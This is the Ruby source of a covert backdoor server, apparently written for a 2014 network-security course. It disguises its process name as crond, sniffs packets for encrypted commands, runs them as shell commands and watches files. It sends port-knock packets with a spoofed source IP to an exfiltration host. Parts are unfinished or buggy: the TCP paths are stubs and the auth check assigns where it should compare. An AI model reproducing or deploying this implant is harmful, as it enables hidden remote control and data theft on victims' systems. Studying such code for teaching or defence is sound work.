#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   server.rb - Backdoor server. Runs discretely on targer computer
--                            waiting to receive shell or watch commands from hacker.
--                            Payloads are decrypted and information is transported
--                            covertly.
--
-- PROGRAM:       server
--                ./server.rb
--
-- FUNCTIONS:     libpcap packet sniffing, remote shell, file monitoring,
--                file transfer, backdoor, file I/O, packet crafting,
--                encryption, decryption, port knocking, covert channels
--
-- Ruby Gems req: packetfu
--                https://rubygems.org/gems/packetfu
--                fssm
--                https://rubygems.org/gems/fssm
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         ** weird buffer for capture, client needs to send 2 commmands
--                  before server receives both at the same time
--                **watch functionality starts threads, no implemented interface
--                  to manage or kill them
--                ** TODO: all tcp implementations
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require 'fssm'
require_relative 'util.rb'

# rename process immediately
$0 = "/usr/sbin/crond -n"

## Variables

## Application Strings
CONFIG_FILE = "not_important"
CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# exfil_addr = 8.8.8.8\n"
CONFIG_FILE_DEFAULT << "\# ttl = 3600\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
DIR = "dir"
FILE = "file"

## Functions

# Starts the listening server for the backdoor. This is on libpcap filering on
# the configuration from the conf file. if correct packets are found, the payloads
# are parsed and executed depending on what was received.
# Implemented protocols: TCP, UDP
def start_listen_server
  puts "server listening on #{$cfg_iface}->#{$cfg_pen_protocol}:#{$cfg_pen_port}"
  #filter = "#{$cfg_pen_protocol} and dst port #{$cfg_pen_port}"
  # ^for whatever reason this filter stopped working?
  filter = "udp"
  begin
    cap = PacketFu::Capture.new(:iface => $cfg_iface,
      :start => true,
      :promic => true,
      :filter => filter)
    cap.stream.each do |p|
      pkt =  PacketFu::Packet.parse(p)
      if $cfg_pen_protocol == TCP && pkt.udp_dst == $cfg_pen_port
        puts "in TCP mode" #DEBUG
        #check for auth
        #if auth'd parse payload for command
        #do command
      elsif $cfg_pen_protocol == UDP && pkt.udp_dst == $cfg_pen_port
        puts "in UDP mode" #DEBUG
        payload = decrypt(pkt.payload)
        cmds = payload.split(' ')
        if cmds[0] = AUTH_STRING
          case cmds[1]
          when MODE_SHELL
            cmd = cmds[2..-1].join(' ')
            results = %x{ #{cmd} } #execute and store output
            send_out(:msg, results)
          when MODE_WATCH
            if cmds[2] == DIR
              start_watch(DIR, cmds[3])
            elsif cmds[2] == FILE
              start_watch(FILE, cmds[3])
            end
          end
        else
          next #not auth or not implemented protocol, skip
        end
      end
    end
  rescue Exception => e
    puts "error in packet capture"
    puts e.trace
    #if bad error raise exception to kill program
  end
end

# Starts a monitor on a file or directory. Looks for creation
# deletion, updates the "glob" or pattern provided in.
# @param [String] type
# - type of watch, dir or file
# @param [String] name
# - path to the dir or the file
def start_watch(type, name)
  puts "start_watch"
  if type == DIR
    glob = '**/*'
    path = name
  else
    #parse file from path
    #glob = 
    #path = 
  end
  t = Thread.new {
    begin
      FSSM.monitor(path, glob) do ############THIS IS BLOCKING??? fix this
        update { |base, relative|
          puts "#{base}/#{relative} has been updated"
          send_out(:file, "#{base}/#{relative}")
        }
        delete { |base, relative|
          puts "#{base}/#{relative} has been deleted"
          send_out(:msg, "#{base}/#{relative} has been deleted")
        }
        create { |base, relative|
          puts "#{base}/#{relative} has been created"
          send_out(:file, "#{base}/#{relative}")
        }
      end
    rescue Exception => e
      puts "bad stuff in monitor"
      puts e.message
    end
  }
  t.join
  puts "watch on #{name} started"
end

# Determins the method in which to send data to the client
# and sends the knock sequence.
# @param [Symbol] mode
# - symbol for either file or message to determine method of transfer
# @param [string] data
# - if delete, message that its been deleted with path
#   if update or create, passes the pathname to send file
def send_out(mode, data)
  if mode == :file
    generate_knock_seq
  elsif mode == :msg
    generate_knock_seq
  else
    #should probs not get here
  end     
end

# Generates knock sequence to the configured protocol and client.
# It provides the client with how the receiving server should be
# configured on the payload.
# Knock is on 3 ports.
# Implemented protocols: TCP, UDP
# UDP: 44444, 55555, 44544
# TCP: tbd
def generate_knock_seq
  puts "generating knock"
  begin
    iface_config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
  rescue Exception => e
    puts "error in PF config"
    puts e.message
  end
  covert_config = "#{$cfg_exfil_protocol},#{$cfg_exfil_port},#{$cfg_exfil_ttl}"
  puts covert_config

  if $cfg_exfil_protocol == UDP
    begin
      3.times {
        udp_packet(iface_config, 44444, covert_config)
        sleep 0.2
      }
      sleep 2
      3.times {
        udp_packet(iface_config, 55555, covert_config)
        sleep 0.2
      }
      sleep 2
      3.times {
        udp_packet(iface_config, 44544, covert_config)
        sleep 0.2
      }
      sleep 5
    rescue Exception => e
      puts "error in udp knock"
      puts e.message
    end
  elsif $cfg_exfil_protocol == TCP
  else
    #should not get here, protocol not implemented
  end
      
end

# Crafts a UDP packet and sends to configured exfiltration IP.
# @param [string] config
# - PacketFu configration
# @param [FixNum] port
# - port to send to 
# @param [string] payload
# - configuration to include for client
def udp_packet(config, port, payload)
  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")

  udp_pkt.udp_dst = port
  udp_pkt.udp_src = rand(0xffff)
  udp_pkt.ip_saddr = "8.8.8.8"
  #udp_pkt.ip_saddr = [rand(0xff),rand(0xff),rand(0xff),rand(0xff)].join('.')
  udp_pkt.ip_daddr = $cfg_exfil_ip
  udp_pkt.payload = encrypt(payload)

  udp_pkt.recalc
  udp_pkt.to_w($cfg_iface)

  puts "udp packet sent #{$cfg_exfil_ip} on #{port}"
end

# Crafts a TCP packet and sends to configured exfiltration IP.
# @param [string] config
# - PacketFu configration
# @param [FixNum] port
# - port to send to 
# @param [string] payload
# - configuration to include for client
def tcp_packet(config, port, payload)

end

## Main

# check for root
raise 'Must run as root' unless Process.uid == 0
load_config_file
begin
  listen_thread = Thread.new { start_listen_server }
  listen_thread.join
rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
  Thread.kill(listen_thread)
  exit 0
end
